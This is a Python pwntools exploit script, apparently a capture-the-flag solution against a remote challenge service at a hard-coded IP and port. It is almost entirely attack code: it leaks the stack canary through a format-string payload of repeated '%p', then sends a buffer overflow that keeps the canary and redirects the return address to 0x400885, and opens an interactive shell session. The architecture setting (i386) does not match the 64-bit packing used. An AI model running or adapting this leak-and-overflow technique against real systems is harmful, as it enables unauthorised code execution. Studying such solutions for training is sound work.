#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 109.233.56.90 --port 11589
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11589)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


# тут без комментариев, потому что решал давно и вспоминать лень


io = start()

io.send(b'%p'*65 + b'%p\n')
io.recvuntil(b'Welcome, ')
data = io.recvuntil(b'!')
data = data[:len(data) - 1].split(b'0x')
stack = b''
for i in range(len(data)):
    cnt = 0
    while (b'(nil)' in data[i]):
        data[i] = data[i][:len(data[i])-5]
        cnt += 1
        if (len(data[i]) < 16):
            data[i] = b'0'*(16-len(data[i])) + data[i]
    stack += data[i] + b'\n' + (b'0'*16 + b'\n')*cnt

canary = p64(int(stack.split(b'\n')[23], 16))
rbp = p64(int(stack.split(b'\n')[24], 16))
print("canary")
print(canary)
print("rbp")
print(rbp)

pl = b'a'*136
pl += canary
pl += p64(0xdead) # rbp 
pl += p64(0x400885) # ret
pl = pl[:len(pl) - 1]
io.send(pl + b'\n')

io.interactive()

